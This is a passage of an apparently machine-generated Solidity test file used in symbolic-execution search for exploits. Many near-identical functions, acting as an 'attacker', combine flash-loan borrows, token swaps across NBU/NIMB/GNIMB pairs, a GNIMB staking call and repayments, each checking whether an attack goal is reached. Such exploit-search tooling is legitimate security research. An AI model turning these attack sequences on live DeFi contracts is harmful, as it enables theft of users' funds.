        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5516(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5517(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5518(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5519(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5520(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5521(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_nbu_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5522(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5523(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5524(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5525(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5526(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbugnimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5527(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5528(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_owner_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5529(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5530(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5531(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5532(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt6 == (amt0 * 1003) / 1000);
        vm.assume(amt6 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5533(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_owner_nbu(amt5);
        swap_pairnbugnimb_gnimb_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5534(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5535(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5536(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5537(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5538(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt6 == (amt0 * 1003) / 1000);
        vm.assume(amt6 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5539(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_owner_nbu(amt5);
        swap_pairnbugnimb_gnimb_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5540(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5541(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5542(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5543(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5544(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt6 == (amt0 * 1003) / 1000);
        vm.assume(amt6 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5545(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_owner_nbu(amt5);
        swap_pairnbugnimb_gnimb_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5546(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5547(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5548(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5549(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5550(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt6 == (amt0 * 1003) / 1000);
        vm.assume(amt6 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5551(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_owner_nbu(amt5);
        swap_pairnbugnimb_gnimb_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5552(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        payback_owner_nimb(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5553(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5554(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5555(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5556(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_owner_nimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5557(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt6 == (amt0 * 1003) / 1000);
        vm.assume(amt6 == (amt1 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        borrow_owner_nimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbunimb_nimb_nbu(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        payback_owner_nbu(amt6);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand5558(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
